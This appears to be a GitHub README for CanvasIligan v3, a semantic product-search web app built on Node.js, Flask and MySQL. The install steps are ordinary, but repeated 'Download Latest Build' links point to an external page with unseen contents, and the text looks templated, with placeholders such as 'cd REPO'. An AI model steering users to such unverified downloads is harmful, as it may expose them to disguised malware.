# CanvasIligan v3 - Semantic Product Search Web Application 2026

> **CanvasIligan is a browser-based product discovery tool for Iligan City that pairs natural-language semantic search with product availability, pricing, and store information.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/westalexky8727/canvasiligan-search-app?style=flat-square)](https://github.com/westalexky8727/canvasiligan-search-app)

---

<p align="center">
  <a href="https://westalexky8727.github.io/canvasiligan-search-app/">
    <img src="https://img.shields.io/badge/Download-CanvasIligan%20Latest-brightgreen?style=for-the-badge" alt="Download CanvasIligan">
  </a>
</p>

> **[Download CanvasIligan v3](https://westalexky8727.github.io/canvasiligan-search-app/)**

---

[Download Latest Build](https://westalexky8727.github.io/canvasiligan-search-app/)

---

## What CanvasIligan Does

CanvasIligan lets users describe the products they want in everyday language instead of depending exclusively on exact-name searches. Its machine-learning search layer interprets those requests with sentence transformers and Faiss, while keyword boosting gives extra importance to meaningful terms when appropriate.

Information gathered from different stores is presented through a single search experience. Depending on the query, users can inspect availability, estimated price ranges, store information, categories, and individual product pages. The same workflow also supports project-oriented searches, including requests for items needed to assemble a starter kit.

---

## Highlights

- Accept product requests written as natural-language descriptions.
- Blend semantic similarity with keyword boosting to improve ranking.
- Give project-related starter-kit searches more relevant ordering.
- Look up availability across several stores.
- Show approximate product price ranges.
- Provide store information and separate product views.
- Apply category filtering on the server.
- Navigate larger result collections through pagination.
- Run the primary application on Node.js and Express.
- Integrate with a Python Flask machine-learning service.
- Fall back to offline SVG placeholders when product images are missing.
- Include CSP, CORS, and API rate-limiting protections.

---

## Getting Started

The system consists of a Node.js web application, a Python machine-learning service, and a MySQL database containing product and store information.

1. Clone the repository:

   ```bash
   git clone https://github.com/westalexky8727/canvasiligan-search-app.git
   cd REPO
   ```

2. Fetch the Node.js packages:

   ```bash
   npm install
   ```

3. Set up a virtual environment for the Flask component:

   ```bash
   python -m venv .venv
   ```

   On macOS or Linux:

   ```bash
   source .venv/bin/activate
   ```

   On Windows:

   ```powershell
   .venv\Scripts\Activate.ps1
   ```

4. If the project includes a dependency file, install the Python requirements:

   ```bash
   pip install -r requirements.txt
   ```

5. Set the database and service values specified by the project configuration.

6. Run the Node.js application and the Python Flask service using the project's available scripts or entry points.

---

## Using the Application

To perform a search:

1. Make sure the MySQL database is running.
2. Start the Python Flask machine-learning service.
3. Launch the Node.js and Express backend.
4. Visit the web interface in a browser.
5. Submit a request using natural language, such as a product description or a project need.
6. Narrow the response with category filters and pagination.
7. Review stores, availability, estimated prices, and product information.

When searching for a project collection or starter kit, explain the intended use and the items involved. This gives the ranking system context for emphasizing products related to that project.

---

## Configuration

Place environment-specific values in the configuration approach used by the project, such as a local `.env` file. Sensitive credentials and deployment-only settings should remain outside committed source code.

A typical configuration can look like this:

```env
NODE_ENV=development
PORT=3000
MYSQL_HOST=localhost
MYSQL_PORT=3306
MYSQL_DATABASE=canvasiligan
MYSQL_USER=your_user
MYSQL_PASSWORD=your_password
ML_SERVICE_URL=http://localhost:5000
```

The variable names must match those expected by the application and deployment setup. For complete semantic-search functionality, the Node.js backend needs access to both MySQL and the Flask machine-learning service.

---

## System Requirements

- A current web browser.
- Node.js with npm.
- Python with support for virtual environments.
- An active Python Flask machine-learning service.
- MySQL containing product, store, category, and availability records.
- Connectivity among the Node.js backend, Flask service, and MySQL server.
- Enough storage for dependencies, sentence-transformer models, Faiss indexes, and project data.

---

## Frequently Asked Questions

### What does CanvasIligan provide?

CanvasIligan is a web application that helps users discover products through semantic search and inspect availability, prices, and store details.

### Do queries have to use exact product names?

No. The search service accepts natural-language descriptions. Keyword boosting can also help when certain terms need stronger influence.

### Why might an expected product be missing or unavailable?

The displayed availability comes from the product and store records provided to the application. If an item is absent, inspect the configured MySQL data and related store records.

### What is the update process?

Pull the newest repository changes, reinstall packages if the dependency definitions were modified, check any configuration changes, then restart the Node.js backend and the Flask machine-learning service.

### Where do I edit local settings?

Update the project's environment or configuration files for values such as database access, ports, and the machine-learning service address. Keep passwords and other private credentials out of the repository.

### What can cause semantic search to stop working?

Verify that the Flask service is running and that its configured endpoint agrees with the Node.js settings. Also check that the required sentence-transformer and Faiss resources exist and that the backend can connect to the service.

### Is product imagery mandatory?

No. When product images cannot be provided, the application can display offline SVG placeholders.

---

## Planned Improvements

- Raise semantic-ranking quality across more product categories.
- Extend ordering support for project-based starter kits.
- Improve comparison and availability views for multiple stores.
- Continue refining filters and result navigation.
- Further develop service configuration and deployment procedures.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
